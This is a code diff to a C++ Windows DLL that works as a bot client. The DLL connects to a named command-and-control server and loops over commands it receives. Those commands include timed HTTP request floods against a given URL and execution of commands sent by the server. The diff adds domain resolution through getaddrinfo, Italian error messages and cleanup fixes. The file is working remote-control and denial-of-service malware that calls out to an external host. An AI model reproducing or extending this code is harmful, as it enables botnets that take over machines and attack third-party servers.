@@ -7,17 +7,21 @@
 #include "pch.h"
 #include <windows.h>
 
+#define SHELLCODELEN	2048
+
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <synchapi.h>
 
 #include <iostream>
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <iphlpapi.h>
 #include <wininet.h>
 #include <chrono>
 #include <thread>
 
 #include <iostream>
+#include <algorithm>
 #include <sstream>
 #include <vector>
 
@@ -28,7 +32,7 @@
 // Mutex name for synchronizing access to the flag file
 const wchar_t* mutexName = L"DC2DLLMutex";
 const char inputParamsSeparator = ' ';
-const int ATK_SRV_PORT = 5000;
+const char* ATK_SRV_PORT = "5000";
 const char* ATK_SRV_ADDR = "c2server.francecentral.cloudapp.azure.com";
 
 std::vector<std::string> parseCommand(const std::string& input, char separator) {
@@ -54,7 +58,7 @@ void showMessageInDLL(const std::string& message) {
 
 void PerformHttpGetRequest(const std::string& url, int requestsPerMinute, int numberOfMinutes) {
     std::string result;
-    int delayBetweenRequests = 60/float(requestsPerMinute) * 1000;
+    int delayBetweenRequests = 60 / float(requestsPerMinute) * 1000;
     int totalRequestCount = requestsPerMinute * numberOfMinutes;
     HINTERNET hInternet = InternetOpen(L"HTTPGETREQUEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
@@ -65,7 +69,7 @@ void PerformHttpGetRequest(const std::string& url, int requestsPerMinute, int nu
         }
         InternetCloseHandle(hInternet);
     }
-    
+
 }
 
 extern "C" __declspec(dllexport) void ConnectToServer() {
@@ -85,16 +89,29 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
         return;
     }
 
-    // Set up server address
-    sockaddr_in serverAddress{};
-    serverAddress.sin_family = AF_INET;
-    serverAddress.sin_port = htons(ATK_SRV_PORT);
-    serverAddress.sin_addr.s_addr = inet_addr(ATK_SRV_ADDR);
+    // Risoluzione del nome di dominio
+    addrinfo hints{}, * result = nullptr;
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    if (getaddrinfo(ATK_SRV_ADDR, ATK_SRV_PORT, &hints, &result) != 0) {
+        std::cerr << "Risoluzione del nome di dominio fallita: " << WSAGetLastError() << std::endl;
+        showMessageInDLL("Risoluzione del nome di dominio fallita: " + WSAGetLastError());
+        closesocket(clientSocket);
+        WSACleanup();
+        return;
+    }
 
 
     // Connect to the server
-    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
+    if (connect(clientSocket, result->ai_addr, static_cast<int>(result->ai_addrlen)) == SOCKET_ERROR) {
         std::cerr << "Failed to connect to the server" << std::endl;
+        char ipString[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &(((struct sockaddr_in*)result->ai_addr)->sin_addr), ipString, INET_ADDRSTRLEN);
+        unsigned short port = ntohs(((struct sockaddr_in*)result->ai_addr)->sin_port);
+        showMessageInDLL("Failed to connect to the server: " + std::string(ipString) + ":" + std::to_string(port));
+        freeaddrinfo(result);
         closesocket(clientSocket);
         WSACleanup();
         return;
@@ -105,6 +122,7 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     const char* data = "Hello, server!";
     if (send(clientSocket, data, strlen(data), 0) == SOCKET_ERROR) {
         std::cerr << "Failed to send data" << std::endl;
+        freeaddrinfo(result);
         closesocket(clientSocket);
         WSACleanup();
         return;
@@ -117,26 +135,35 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     char buffer[1024];
     while (true) {
         memset(command, 0, sizeof(command));
-        if (recv(clientSocket, command, sizeof(command) - 1, 0) == SOCKET_ERROR) {
+        int recvResult = recv(clientSocket, command, sizeof(command), 0);
+        if (recvResult == SOCKET_ERROR) {
             std::cerr << "Failed to receive data" << std::endl;
+            showMessageInDLL("Errore socket");
+            break;
+        }
+
+        if (recvResult == 0) {
+            std::cerr << "Socket closed" << std::endl;
+            showMessageInDLL("Socket chiusa");
             break;
         }
 
         std::vector<std::string> params = parseCommand(command, inputParamsSeparator);
 
         std::string action = params[0];
+        std::transform(action.begin(), action.end(), action.begin(), ::toupper);
 
         //Different parsing based on first command (parameters)
-        if (action == "PING") { 
+        if (action == "PING") {
             // NO PARAMS
             const char* pong_msg = "PONG";
             send(clientSocket, pong_msg, strlen(pong_msg), 0);
         }
         else if (action == "GET") {
             // PARAMETERS: URL, REQ/MIN, NUM_MIN
-            // es. GET|http://localhost:80/resource.html|30|1 
+            // es. GET http://localhost:80/resource.html 30 1 
 
-            PerformHttpGetRequest(params[1], stoi(params[2]),stoi(params[3]));
+            PerformHttpGetRequest(params[1], stoi(params[2]), stoi(params[3]));
         }
         else if (action == "CMD") {
             // PARAMETER: COMMAND
@@ -188,6 +215,7 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     }
 
     // Close the socket and cleanup Winsock
+    freeaddrinfo(result);
     closesocket(clientSocket);
     WSACleanup();
 }
